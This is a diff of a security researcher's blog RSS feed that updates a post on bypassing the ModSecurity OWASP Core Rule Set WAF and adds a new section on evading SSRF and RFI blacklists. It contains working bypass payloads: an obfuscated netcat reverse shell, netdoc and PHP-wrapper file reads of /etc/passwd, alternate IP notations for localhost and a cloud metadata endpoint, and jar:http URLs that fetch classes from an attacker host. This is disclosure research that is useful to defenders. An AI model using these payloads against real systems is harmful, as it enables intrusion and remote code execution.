@@ -10,11 +10,11 @@
         <atom:link href="https://0xinfection.xyz/posts/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
-            <title>Bypassing ModSecurity CRS for RCE(s)</title>
-            <link>https://0xinfection.xyz/posts/bypassing-modsecurity-crs-for-rces/</link>
+            <title>Breaking the WAF Wall: ModSecurity CRS</title>
+            <link>https://0xinfection.xyz/posts/breaking-the-waf-wall-modsecurity-crs/</link>
             <pubDate>Thu, 21 Aug 2025 00:00:00 +0530</pubDate>
             
-            <guid>https://0xinfection.xyz/posts/bypassing-modsecurity-crs-for-rces/</guid>
+            <guid>https://0xinfection.xyz/posts/breaking-the-waf-wall-modsecurity-crs/</guid>
             <description>&lt;p&gt;Hola amigos! I&amp;rsquo;m excited to finally share this unfinished blog post from 2023. After some time away, I&amp;rsquo;ve finally gathered the energy to complete and publish this blog.&lt;/p&gt;
 &lt;p&gt;Today&amp;rsquo;s post explores the bypasses I discovered for the OWASP CRS (Core Rule Set) Project during 1337UP0522 live hacking event hosted by The Paranoids team at Yahoo in collaboration with Intigriti. Needless to mention, the event was a blast!&lt;/p&gt;
 &lt;h2 id=&#34;quick-primer-to-wafs&#34;&gt;Quick Primer to WAFs&lt;/h2&gt;
@@ -102,11 +102,11 @@ The final bypass payload looked similar to this:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ln <span style="color:#f92672">-</span>s <span style="color:#f92672">/[</span>abc<span style="color:#f92672">]</span>in<span style="color:#f92672">/</span>nc <span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>pew; <span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>pew <span style="color:#f92672">-</span>e <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>zsh 10.<span style="color:#a6e22e">0</span>.<span style="color:#a6e22e">0</span>.<span style="color:#a6e22e">2</span> 10002
 </span></span></code></pre></div><p>At the time of publishing the article, a set of 5 rules detect the payload:</p>
 <ul>
-<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf#L99"><code>930120</code></a> - OS File Access Attempt (PL1)</li>
-<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L293"><code>932130</code></a> - Remote Command Execution: Unix Shell Expression Found (PL1)</li>
-<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L631"><code>932160</code></a> - Remote Command Execution: Unix Shell Code Found (PL1)</li>
-<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L1296"><code>932240</code></a> - Remote Command Execution: Unix Command Injection evasion attempt detected (PL2)</li>
-<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L1578"><code>932236</code></a> - Remote Command Execution: Unix Command Injection (command without evasion) (PL2)</li>
+<li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf#L99"><code>930120</code></a> - OS File Access Attempt (PL1)</li>
+<li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L293"><code>932130</code></a> - Remote Command Execution: Unix Shell Expression Found (PL1)</li>
+<li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L631"><code>932160</code></a> - Remote Command Execution: Unix Shell Code Found (PL1)</li>
+<li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L1296"><code>932240</code></a> - Remote Command Execution: Unix Command Injection evasion attempt detected (PL2)</li>
+<li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L1578"><code>932236</code></a> - Remote Command Execution: Unix Command Injection (command without evasion) (PL2)</li>
 </ul>
 <h3 id="executing-arbitrary-powershell">Executing Arbitrary PowerShell</h3>
 <p>There are specific PowerShell cmdlets allow you to fetch and run remote scripts directly in memory without the payload touching the disk.
@@ -133,8 +133,8 @@ As expected, CRS blocks both cmdlets <code>Invoke-Expression</code> and <code>In
 </ul>
 <p>At the time of publishing the article, the following two rules detect the payload:</p>
 <ul>
-<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L214"><code>932120</code></a> - Remote Command Execution: Windows PowerShell Command Found (PL1)</li>
-<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L1296"><code>932240</code></a> - Remote Command Execution: Unix Command Injection evasion attempt detected (PL2)</li>
+<li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L214"><code>932120</code></a> - Remote Command Execution: Windows PowerShell Command Found (PL1)</li>
+<li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L1296"><code>932240</code></a> - Remote Command Execution: Unix Command Injection evasion attempt detected (PL2)</li>
 </ul>
 <h3 id="accessing-local-files">Accessing Local Files</h3>
 <p>This section of bypasses was more RTFM than hacker magic. CRS blacklists a list of default sensitive files that should not be allowed in HTTP requests.</p>
@@ -153,7 +153,7 @@ As expected, CRS blocks both cmdlets <code>Invoke-Expression</code> and <code>In
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>security<span style="color:#f92672">/</span>pwquality.conf
 </span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>security<span style="color:#f92672">/</span>faillock.conf
 </span></span></code></pre></div><p>These gives us our third bypass.</p>
-<p>This bypass was properly fixed by updates to the <code>lfi-os-files.data</code> which is utilised by rule <a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf#L90-L118"><code>930120</code></a>.</p>
+<p>This bypass was properly fixed by updates to the <code>lfi-os-files.data</code> which is utilised by rule <a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf#L90-L118"><code>930120</code></a>.</p>
 <h3 id="abusing-legacy-protocols-and-php-wrappers">Abusing Legacy Protocols and PHP Wrappers</h3>
 <p>A lesser known, legacy Java (&lt;= JDK 8) protocol is <code>netdoc:</code>, which acts similarly to the <code>file:</code> protocol in Java-based XML parsers. CRS appropriately detects most of the protocols like <code>http://</code>, <code>ftp://</code>, <code>file://</code>, etc, but does not filter out <code>netdoc:</code>. This makes it possible to bypass CRS in Java environments (&lt;= JDK 8).</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>netdoc:<span style="color:#f92672">///</span>etc<span style="color:#f92672">/</span>passwd
@@ -163,8 +163,44 @@ As expected, CRS blocks both cmdlets <code>Invoke-Expression</code> and <code>In
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>compress<span style="color:#f92672">.</span>bzip2:<span style="color:#f92672">//</span>path<span style="color:#f92672">/</span>to<span style="color:#f92672">/</span>sensitive<span style="color:#f92672">.</span>bz2
 </span></span></code></pre></div><p>The following 2 rules detect these payloads now:</p>
 <ul>
-<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-931-APPLICATION-ATTACK-RFI.conf#L119"><code>931130</code></a> - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link (PL2)</li>
-<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf#L253"><code>933200</code></a> - PHP Injection Attack: Wrapper scheme detected (PL1)</li>
+<li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-931-APPLICATION-ATTACK-RFI.conf#L119"><code>931130</code></a> - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link (PL2)</li>
+<li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf#L253"><code>933200</code></a> - PHP Injection Attack: Wrapper scheme detected (PL1)</li>
+</ul>
+<h3 id="bypassing-blacklisted-ip-address-notations">Bypassing Blacklisted IP Address Notations</h3>
+<p><strong>SSRF</strong></p>
+<p>The <a href="https://github.com/coreruleset/coreruleset/blob/5eefcce513aa214a1843a5806d55a8f11ba74cca/rules/ssrf.data"><code>ssrf.data</code></a> file contains a list of blacklisted IP address notations intended to prevent Server-Side Request Forgery (SSRF) attempts.</p>
+<p>IP address notations are wild. For example, the following variations all resolve to the same IP address <code>1.0.0.1</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>http:<span style="color:#f92672">//</span><span style="color:#ae81ff">1.0.0.1</span>
+</span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//</span><span style="color:#ae81ff">1.0.1</span>
+</span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//</span><span style="color:#ae81ff">16777217</span>
+</span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//</span><span style="color:#ae81ff">0x1</span><span style="color:#ae81ff">.0</span>x0<span style="color:#ae81ff">.0</span>x0<span style="color:#ae81ff">.0</span>x1
+</span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//</span><span style="color:#ae81ff">0x01000001</span>
+</span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//</span><span style="color:#ae81ff">0x1</span><span style="color:#ae81ff">.0</span>x000001
+</span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//</span><span style="color:#ae81ff">01.00.00.01</span>
+</span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//</span><span style="color:#ae81ff">000000001.0000.00000000.001</span>
+</span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//</span><span style="color:#ae81ff">0100000001</span>
+</span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//%</span><span style="color:#ae81ff">31</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">30</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">30</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">31</span>
+</span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//</span><span style="color:#ae81ff">1.0</span>x0<span style="color:#ae81ff">.00000000.0</span>x1
+</span></span></code></pre></div><p>If you&rsquo;re bamboozled and scratching your head over how this is possible, I&rsquo;d suggest you to read the <a href="https://linux.die.net/man/3/inet_aton"><code>inet_aton(3)</code></a> manual.</p>
+<p>When an SSRF exploit involves localhost IP addresses, the Core Rule Set (CRS) attempts to block these to prevent exploitation. However, bypasses can still be crafted. For instance:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>http://127.1 <span style="color:#f92672">(</span>equivalent of 127.0.0.1<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Similarly, the blacklist for Oracle Cloud metadata endpoint (<code>192.0.0.192</code>) can be bypassed using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>http://192.192/<span style="color:#f92672">{</span>version<span style="color:#f92672">}</span>/metadata
+</span></span></code></pre></div><p>These techniques allow attackers to craft multiple variants of bypass payloads that evade SSRF detection.</p>
+<hr>
+<p><strong>RFI</strong></p>
+<p>In Java environments, the <code>JarURLConnection</code> class permits access to the contents of a JAR file (or an entry within one) using a URL, including URLs with the <code>http</code> scheme. For example:</p>
+<pre tabindex="0"><code>jar:http://www.foo.com/bar/baz.jar!/COM/foo/qutie.class`
+</code></pre><p>This retrieves the <code>qutie.class</code> file from the <code>baz.jar</code> archive via HTTP from <code>www.foo.com</code>.</p>
+<p>Suppose an attacker hosts a malicious JAR file on their own server hosted at <code>12.0.31.123</code> (say) and tries to exploit the target application into fetching classes directly from it. Combining this approach with alternative IP notations enables us to craft payloads such as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>jar:http:<span style="color:#f92672">//</span><span style="color:#ae81ff">12.8059</span><span style="color:#f92672">/</span>bar<span style="color:#f92672">/</span>baz<span style="color:#f92672">.</span>jar<span style="color:#960050;background-color:#1e0010">!</span><span style="color:#f92672">/</span>COM<span style="color:#f92672">/</span>foo<span style="color:#f92672">/</span>qutie<span style="color:#f92672">.</span><span style="color:#66d9ef">class</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jar</span>:http:<span style="color:#f92672">//</span><span style="color:#ae81ff">201334651</span><span style="color:#f92672">/</span>bar<span style="color:#f92672">/</span>baz<span style="color:#f92672">.</span>jar<span style="color:#960050;background-color:#1e0010">!</span><span style="color:#f92672">/</span>COM<span style="color:#f92672">/</span>foo<span style="color:#f92672">/</span>qutie<span style="color:#f92672">.</span><span style="color:#66d9ef">class</span>
+</span></span></code></pre></div><p>Both examples resolve to the attacker-controlled IP <code>12.0.31.123</code>, allowing malicious retrieval of the qutie.class file. This effectively turns a seemingly simple URL bypass into a powerful vector for injecting untrusted code into the victim environment.</p>
+<p>At the time of writing this blogpost, the following 2 rules detect the above payloads:</p>
+<ul>
+<li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-931-APPLICATION-ATTACK-RFI.conf#L108"><code>931130</code></a> - Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link</li>
+<li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf#L90"><code>934110</code></a> - Server Side Request Forgery (SSRF) Attack: Cloud provider metadata URL in Parameter</li>
 </ul>
 <h3 id="complete-request-body-bypass">Complete Request Body Bypass</h3>
 <p>This one deserves a special mention as it probably is the most interesting of all my findings that I stumbled upon.</p>
@@ -226,7 +262,7 @@ As expected, CRS blocks both cmdlets <code>Invoke-Expression</code> and <code>In
 # JSON for JSON data, XML for XML data, etc).
 </code></pre><p>CRS now detects such non-standard content-types via:</p>
 <ul>
-<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf#L935"><code>920420</code></a> - Request content type is not allowed by policy</li>
+<li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf#L935"><code>920420</code></a> - Request content type is not allowed by policy</li>
 </ul>
 <h2 id="credits-where-its-due">Credits Where Its Due</h2>
 <p>ModSecurity and the OWASP Core Rule Set (CRS) are invaluable contributions to the open-source community.</p>
@@ -237,11 +273,11 @@ My thanks also go to <a href="https://x.com/intigriti">Intigriti</a> and the <a 
         </item>
         
         <item>
-            <title>Analyzing two FreeSWITCH vulnerabilities -- CVE-2021-41157 &amp; CVE-2021-37624</title>
-            <link>https://0xinfection.xyz/posts/analyzing-two-freeswitch-vulnerabilities--cve-2021-41157-cve-2021-37624/</link>
+            <title>Analyzing two FreeSWITCH vulnerabilities — CVE-2021-41157 &amp; CVE-2021-37624</title>
+            <link>https://0xinfection.xyz/posts/analyzing-two-freeswitch-vulnerabilities-cve-2021-41157-cve-2021-37624/</link>
             <pubDate>Sun, 31 Oct 2021 00:00:00 +0530</pubDate>
             
-            <guid>https://0xinfection.xyz/posts/analyzing-two-freeswitch-vulnerabilities--cve-2021-41157-cve-2021-37624/</guid>
+            <guid>https://0xinfection.xyz/posts/analyzing-two-freeswitch-vulnerabilities-cve-2021-41157-cve-2021-37624/</guid>
             <description>&lt;p&gt;This post is about two vulnerabilities that I researched on a year back in the FreeSWITCH VoIP server that were fixed and disclosed publicly a few weeks ago. Both of the vulnerabilities were issues that affected the SIP functionality in all versions below v1.10.7 and were categorized under &lt;a href=&#34;https://cwe.mitre.org/data/definitions/287.html&#34;&gt;CWE-287&lt;/a&gt;.&lt;/p&gt;
 &lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
 &lt;p&gt;The story dates to a year ago, back when I was still learning about RTC (real-time communications) security and working under &lt;a href=&#34;https://twitter.com/sandrogauci&#34;&gt;Sandro&lt;/a&gt; &amp;ndash; where we used to do a lot of research on real-time communication infra. One fine day, he asked me to get familiar with FreeSWITCH, since it was a good alternative to Asterisk. A few days into fiddling around, I figured out that there isn&amp;rsquo;t much security enabled for a some SIP components in a default installation.&lt;/p&gt;</description>
